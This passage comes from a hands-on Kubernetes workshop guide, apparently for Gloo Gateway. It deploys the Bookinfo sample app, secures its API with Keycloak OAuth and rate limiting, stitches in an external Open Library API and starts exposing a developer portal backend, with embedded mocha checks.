  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: httpbin1
      version: v1
  template:
    metadata:
      labels:
        app: httpbin1
        version: v1
    spec:
      serviceAccountName: httpbin1
      containers:
      - name: httpbin
        image: mccutchen/go-httpbin:v2.14.0
        command: [ go-httpbin ]
        args:
          - "-max-duration"
          - "600s" # override default 10s
          - -use-real-hostname
        ports:
          - name: http
            containerPort: 8080
            protocol: TCP
        livenessProbe:
          httpGet:
            path: /status/200
            port: http
        readinessProbe:
          httpGet:
            path: /status/200
            port: http
        env:
        - name: K8S_MEM_LIMIT
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.memory
        - name: GOMAXPROCS
          valueFrom:
            resourceFieldRef:
              divisor: "1"
              resource: limits.cpu
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```



## Lab 26 - Deploy the Bookinfo sample application <a name="lab-26---deploy-the-bookinfo-sample-application-"></a>
[<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")

We're going to deploy the Bookinfo sample application to demonstrate several features of Gloo Gateway.

```bash
kubectl --context ${CLUSTER1} create ns bookinfo
kubectl --context ${CLUSTER1} -n bookinfo apply -f https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml
```

<!--bash
kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy --timeout=5m
-->

You can check that the Bookinfo pods are running using the following command:

```bash,noexecute
kubectl --context ${CLUSTER1} -n bookinfo get pods
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Bookinfo app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["productpage-v1", "ratings-v1", "details-v1", "reviews-v1", "reviews-v3"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 26"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
-->
Configure your hosts file to resolve bookinfo.example.com with the IP address of the proxy by executing the following command:

```bash
./scripts/register-domain.sh bookinfo.example.com ${PROXY_IP}
```



## Lab 27 - Expose the productpage API securely <a name="lab-27---expose-the-productpage-api-securely-"></a>

Gloo Gateway includes a developer portal, which provides a framework for managing API discovery, API client identity, and API policies.

First, let's expose, secure and rate-limit the Bookinfo productpage application. Then, we'll use Gloo Gateway to automatically discover and share the API definitions and expose it in a Developer Portal.

The team in charge of the gateway can create a parent `HTTPRoute` to delegate the routing of the domain bookinfo.example.com for any call starting with `/api/bookinfo` to the team in charge of the bookinfo application.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: bookinfo
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "bookinfo.example.com"
  rules:
    # If the request path starts with /api/bookinfo
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo
      # Delegate routing to bookinfo namespace
      backendRefs: 
        - name: '*'
          namespace: bookinfo
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
```

The team in charge of the Bookinfo application can now expose the productpage API through the Gateway using a child `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v1
  namespace: bookinfo
spec:
  rules:
    # If the request path starts with /api/bookinfo/v1
    - matches:
      - path:
          type: PathPrefix
          value: /api/bookinfo/v1
      # Route to the productpage service
      backendRefs:
        - name: productpage
          port: 9080
      # Rewrite the path
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
```

You should now be able to access the API through the gateway without any authentication:

```bash,noexecute
curl -k "https://bookinfo.example.com/api/bookinfo/v1"
```

Here is the expected output:

```json,nocopy
[{"id": 0, "title": "The Comedy of Errors", "descriptionHtml": "<a href=\"https://en.wikipedia.org/wiki/The_Comedy_of_Errors\">Wikipedia Summary</a>: The Comedy of Errors is one of <b>William Shakespeare's</b> early plays. It is his shortest and one of his most farcical comedies, with a major part of the humour coming from slapstick and mistaken identity, in addition to puns and word play."}]
```


<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the API without authentication", () => {
  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
-->


You generally want to secure the access. This is often the responsibility of the team in charge of the gateway to handle this part.

Let's use OAuth tokens for that.

You need to create an `AuthConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs"
EOF
```

Then, you need to create a `RouteOption` which reference this `AuthConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
```

Note that we're configuring CORS in the `RouteOption` to allow the portal frontend to send API calls the `bookinfo` API later.

As you can see, the `RouteOption` is targetting the parent `HTTPRoute`. So it will be applied to all the APIs configured by the team in charge of the Bookinfo application.

You can't use the same option in several `RouteOption` objects applied to same route.

In case of conflict, the priority is given to:
- `ExtensionRef` in a parent `HTTPRoute`
- `ExtensionRef` in the child `HTTPRoute`
- `TargetRef` is the lowest priority

Try to access the API without authentication:

```bash,noexecute
curl -k "https://bookinfo.example.com/api/bookinfo/v1" -I
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
-->

The access is refused (403 response):

```http,nocopy
HTTP/2 403
date: Thu, 25 Apr 2024 09:16:18 GMT
server: envoy
```

Let's create a token for the user `user1`:

```bash
export USER1_TOKEN=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=${KEYCLOAK_CLIENT}" \
  -d "client_secret=${KEYCLOAK_SECRET}" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)

echo export KEYCLOAK_CLIENT=${KEYCLOAK_CLIENT}
echo export KEYCLOAK_SECRET=${KEYCLOAK_SECRET}
echo export KEYCLOAK_URL=${KEYCLOAK_URL}
echo export USER1_TOKEN=${USER1_TOKEN}
```

Now, you should be able to access the API using this token:

```bash,noexecute
curl -k -H "Authorization: Bearer $USER1_TOKEN" "https://bookinfo.example.com/api/bookinfo/v1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
-->

So, we've secured the access to our API, but you generally want to also limit the usage of your API.

We're going to configure rate limiting.

We need to create a `RateLimitConfig` object to define the limits:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-apis
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: userId
        rateLimit:
          requestsPerUnit: 5
          unit: MINUTE
    rateLimits:
      - setActions:
        - metadata:
            descriptorKey: userId
            metadataKey:
              key: envoy.filters.http.ext_authz
              path:
                - key: userId
EOF
```

It defines the limits for each user.

After that, we need to update the `RouteOption` to use the `RateLimitConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: limit-apis
        namespace: gloo-system
EOF
```

Try to access the API more than 5 times:

```bash,noexecute
for i in `seq 1 10`; do curl -k -H "Authorization: Bearer $USER1_TOKEN" "https://bookinfo.example.com/api/bookinfo/v1" -I; done
```

You should be rate limited:

```http,nocopy
HTTP/2 200
content-type: application/json
content-length: 395
server: istio-envoy
date: Thu, 25 Apr 2024 09:17:10 GMT
x-envoy-upstream-service-time: 1

...

HTTP/2 429
x-envoy-ratelimited: true
date: Thu, 25 Apr 2024 09:17:18 GMT
server: istio-envoy
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 27"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
-->

Next, let's tell Gloo about this API. Annotate the Bookinfo's `productpage` Service with information about it's OpenAPI schema. This allows Gloo to discover this APIs schema:

```bash
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-source=https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/swagger.yaml --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-pull-attempts="3" --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-retry-delay=5s --overwrite
kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-use-backoff="true" --overwrite
```

<!--bash
echo Waiting for APIDoc to be created...
timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n bookinfo get apidoc productpage-service) ]]; do
  kubectl --context ${CLUSTER1} -n bookinfo rollout restart deploy productpage-v1
  kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy productpage-v1
  sleep 1
done"
-->

An `APIDoc` Kubernetes object, containing the schema of the API is automatically created:

```bash,noexecute
kubectl --context ${CLUSTER1} -n bookinfo get apidoc productpage-service -o yaml
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("APIDoc has been created", () => {
    it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo", k8sType: "apidoc", k8sObj: "productpage-service" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 27"
timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
-->

You should get something like this:

```yaml,nocopy
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiDoc
metadata:
  annotations:
    cluster.solo.io/cluster: ""
  creationTimestamp: "2024-04-23T15:57:44Z"
  generation: 1
  labels:
    reconciler.mesh.gloo.solo.io/name: schema-reporter-service
  name: productpage-service
  namespace: bookinfo
  resourceVersion: "2098"
  uid: 8c82fabc-cf4d-4894-806b-ac47ba9648b7
spec:
  openapi:
    inlineString: '{"components":{"schemas":{"Product":{"description":"Basic information
      about a product","properties":{"descriptionHtml":{"description":"Description
      of the book - may contain HTML tags","type":"string"},"id":{"description":"Product
      id","format":"int32","type":"integer"},"title":{"description":"Title of the
      book","type":"string"}},"required":["id","title","descriptionHtml"],"type":"object"},"ProductDetails":{"description":"Detailed
      information about a product","properties":{"ISBN-10":{"description":"ISBN-10
      of the book","type":"string"},"ISBN-13":{"description":"ISBN-13 of the book","type":"string"},"author":{"description":"Author
      of the book","type":"string"},"id":{"description":"Product id","format":"int32","type":"integer"},"language":{"description":"Language
      of the book","type":"string"},"pages":{"description":"Number of pages of the
      book","format":"int32","type":"integer"},"publisher":{"description":"Publisher
      of the book","type":"string"},"type":{"description":"Type of the book","enum":["paperback","hardcover"],"type":"string"},"year":{"description":"Year
      the book was first published in","format":"int32","type":"integer"}},"required":["id","publisher","language","author","ISBN-10","ISBN-13","year","type","pages"],"type":"object"},"ProductRatings":{"description":"Object
      containing ratings of a product","properties":{"id":{"description":"Product
      id","format":"int32","type":"integer"},"ratings":{"additionalProperties":{"type":"string"},"description":"A
      hashmap where keys are reviewer names, values are number of stars","type":"object"}},"required":["id","ratings"],"type":"object"},"ProductReviews":{"description":"Object
      containing reviews for a product","properties":{"id":{"description":"Product
      id","format":"int32","type":"integer"},"reviews":{"description":"List of reviews","items":{"$ref":"#/components/schemas/Review"},"type":"array"}},"required":["id","reviews"],"type":"object"},"Rating":{"description":"Rating
      of a product","properties":{"color":{"description":"Color in which stars should
      be displayed","enum":["red","black"],"type":"string"},"stars":{"description":"Number
      of stars","format":"int32","maximum":5,"minimum":1,"type":"integer"}},"required":["stars","color"],"type":"object"},"Review":{"description":"Review
      of a product","properties":{"rating":{"$ref":"#/components/schemas/Rating"},"reviewer":{"description":"Name
      of the reviewer","type":"string"},"text":{"description":"Review text","type":"string"}},"required":["reviewer","text"],"type":"object"}}},"externalDocs":{"description":"Learn
      more about the Istio BookInfo application","url":"https://istio.io/docs/samples/bookinfo.html"},"info":{"description":"This
      is the API of the Istio BookInfo sample application.","license":{"name":"Apache
      2.0","url":"http://www.apache.org/licenses/LICENSE-2.0.html"},"termsOfService":"https://istio.io/","title":"BookInfo
      API","version":"1.0.0"},"openapi":"3.0.3","paths":{"/products":{"get":{"description":"List
      all products available in the application with a minimum amount of information.","operationId":"getProducts","responses":{"200":{"content":{"application/json":{"schema":{"items":{"$ref":"#/components/schemas/Product"},"type":"array"}}},"description":"successful
      operation"}},"summary":"List all products","tags":["product"]}},"/products/{id}":{"get":{"description":"Get
      detailed information about an individual product with the given id.","operationId":"getProduct","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductDetails"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get individual
      product","tags":["product"]}},"/products/{id}/ratings":{"get":{"description":"Get
      ratings for a product, including stars and their color.","operationId":"getProductRatings","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductRatings"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get ratings
      for a product","tags":["rating"]}},"/products/{id}/reviews":{"get":{"description":"Get
      reviews for a product, including review text and possibly ratings information.","operationId":"getProductReviews","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductReviews"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get reviews
      for a product","tags":["review"]}}},"servers":[{"url":"/api/v1"}],"tags":[{"description":"Information
      about a product (in this case a book)","name":"product"},{"description":"Review
      information for a product","name":"review"},{"description":"Rating information
      for a product","name":"rating"}]}'
  servedBy:
  - destinationSelector:
      port:
        number: 9080
      selector:
        name: productpage
        namespace: bookinfo
```

Note that you can also create the `APIDoc` objects manually to allow you to provide the OpenAPI document as code.

Then, we need to create an `ApiProduct` object (a bundle of APIs) targetting the `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: General Availability
EOF
```

We define a single version `v1` and use the version custom metadata to define the lifecycle of it.

As you can see, we can also define custom metadata at the Api product level. We use this capability to define the picture we want to use to represent the ApiProduct in the portal.

After that, we need to create a `Portal` object to define which API products are going to be exposed.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: Portal
metadata:
  name: portal
  namespace: gloo-system
spec:
  # APIs will be accessible to unauthenticated users
  visibility:
    public: true
  # List of API products to be included in the portal
  apiProducts:
    - namespace: bookinfo
EOF
```

Finally, we need to create a `ReferenceGrant` object to allow the `Portal` object in the `gloo-system` namespace to access the `ApiProduct` objects in the `bookinfo` namespace.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-portal-to-access-apiproduct
  namespace: bookinfo
spec:
  # Allow the portal server to reference APIProducts in other namespaces
  from:
    - group: portal.gloo.solo.io
      kind: Portal
      namespace: gloo-system
  to:
    - group: portal.gloo.solo.io
      kind: ApiProduct
EOF
```

Let's delete the `RateLimitConfig` object:

```bash
kubectl --context ${CLUSTER1} -n gloo-system delete ratelimitconfig limit-apis
```

And apply the original `RouteOption`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
EOF
```



## Lab 28 - Expose an external API and stitch it with the productpage API <a name="lab-28---expose-an-external-api-and-stitch-it-with-the-productpage-api-"></a>

You can also use Gloo Gateway to expose an API that is outside of the cluster. In this section, we will expose `https://openlibrary.org/search.json`

In our case, we're simulating the real API using `https://static.is.solo.io` (due to recent outages they had).

Let's create an `Upstream` object to define how to access the host [static.is.solo.io](https://static.is.solo.io/):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  static:
    hosts:
      - addr: static.is.solo.io
        port: 443
  sslConfig: {}
EOF
```

Then, you need to create an `ApiSchemaDiscovery` object to tell Gloo Gateway how to fetch it's OpenAPI document:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiSchemaDiscovery
metadata:
  name: openlibrary
  namespace: bookinfo
spec:
  # Fetch the OpenAPI schema from the Open Library API
  openapi:
    fetchEndpoint:
      url: "https://raw.githubusercontent.com/internetarchive/openlibrary/refs/heads/master/static/openapi.json"
  servedBy:
  - targetRef:
      kind: UPSTREAM
      name: openlibrary
      namespace: bookinfo
    port: 443
EOF
```

An `APIDoc` Kubernetes object should be automatically created:

```bash,noexecute
kubectl --context ${CLUSTER1} -n bookinfo get apidoc openlibrary -o yaml
```

<!--
Finally, you can create a new `HTTPRoute` to stitch together 2 paths from the openlibrary API with the existing Bookinfo API:
-->
Finally, you can create a new `HTTPRoute` to stitch together a path from the openlibrary API with the existing Bookinfo API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: productpage-api-v2
  namespace: bookinfo
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    # If the request path starts with /v2/search.json
    # Rewrite to /search.json and route to the openlibrary upstream
    - matches:
      - path:
          type: PathPrefix
          value: /v2/search.json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /search.json
    # If the request path starts with /v2/authors/{author}.json
    # Apply regex rewrite and route to the openlibrary upstream
    - matches:
      - path:
          type: RegularExpression
          value: /v2/authors/([^.]+).json
      backendRefs:
        - group: gloo.solo.io
          kind: Upstream
          name: openlibrary
          port: 443
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: static.is.solo.io
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: regex-rewrite
    # If the request path starts with /v2
    # Rewrite to /api/v1/products and route to the productpage service
    - matches:
      - path:
          type: PathPrefix
          value: /v2
      backendRefs:
        - name: productpage
          port: 9080
      filters:
        - type: URLRewrite
          urlRewrite:
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /api/v1/products
EOF
```

Note we've added the annotation `delegation.gateway.solo.io/inherit-parent-matcher: "true"` to inherit the matcher from the parent `HTTPRoute`. This means that we do not need to specify the prefix `/api/bookinfo` in the path matchers.

This time, we've used the `ExtensionRef` to select a `RouteOption` to perform a regex rewrite operation.

Let's create this `RouteOption`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: regex-rewrite
  namespace: bookinfo
spec:
  options:
    regexRewrite:
      # rewrite /api/bookinfo/v2/authors/{author}.json to /authors/{author}.json
      pattern:
        regex: /api/bookinfo/v2/authors/([^.]+).json
      substitution: /authors/\1.json
EOF
```

You can check the first path (/v2/search.json going to static.is.solo.io/search.json) is available:

```bash,noexecute
curl -k -H "Authorization: Bearer ${USER1_TOKEN}" "https://bookinfo.example.com/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API", () => {
  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'language', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 28"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
-->

You should see something like this:

```json,nocopy
{
    "numFound": 202,
    "start": 0,
    "numFoundExact": true,
    "docs": [
        {
            "language": [
                "ger",
                "und",
                "eng",
                "tur",
                "ita",
                "fre",
                "tsw",
                "heb",
                "spa",
                "nor",
                "slo",
                "chi",
                "mul",
                "esp",
                "dut",
                "fin"
            ]
        }
    ],
    "num_found": 202,
    "q": "",
    "offset": null
}
```

We've also exposed the `/authors/{olid}.json` path to demonstrate how we can use regular expressions to capture path parameters.

You can try it out with the following command:

```bash,noexecute
curl -k -H "Authorization: Bearer ${USER1_TOKEN}" "https://bookinfo.example.com/api/bookinfo/v2/authors/OL23919A.json"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API with regex", () => {
  it('Checking text \'Rowling\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/authors/OL23919A.json', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'Rowling', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 28"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
-->

We also need to update the `ApiProduct` object to define a new version targetting the new HTTPRoute:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: ApiProduct
metadata:
  name: bookinfo-api
  namespace: bookinfo
spec:
  id: bookinfo
  displayName: BookInfo REST API
  customMetadata:
    imageURL: https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg
  versions:
    - apiVersion: v1
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v1
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v1
        description: |
          # Bookinfo REST API v1 Documentation
          This is some extra information about the API
      customMetadata:
        lifecyclePhase: Deprecated
    - apiVersion: v2
      targetRefs:
      - group: gateway.networking.k8s.io
        kind: HTTPRoute
        name: productpage-api-v2
        namespace: bookinfo
      openapiMetadata:
        title: BookInfo REST API v2
        description: |
          # Bookinfo REST API v1 Documentation
          You can find more information about the openlibrary API [here](https://openlibrary.org/developers/api)
      customMetadata:
        lifecyclePhase: General Availability
EOF
```



## Lab 29 - Expose the dev portal backend <a name="lab-29---expose-the-dev-portal-backend-"></a>

Now that your API has been exposed securely and our plans defined, lets advertise this API through a developer portal.

Two components are serving this purpose:
- the Gloo Gateway portal backend which provides a portal API (that has information about the published API Products)
- the Gloo Gateway portal frontend which consumes this portal API

In this lab, we're going to set up the Gloo Gateway Portal backend.

First, you need to create an `AuthConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: portal
  namespace: gloo-system
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://portal.example.com"
          callbackPath: /v1/login
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /v1/logout
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: id_token
EOF
```

Then, you need to create a `RouteOption` which references this `AuthConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-portal-api
  namespace: gloo-system
spec:
  options:
    extauth:
      configRef:
        name: portal
        namespace: gloo-system
EOF
```

Finally, you can expose the portal API through Gloo Gateway using a `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-server
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
        headers:
        - name: Authorization
          type: RegularExpression
          value: Bearer\s.*
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-apis
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
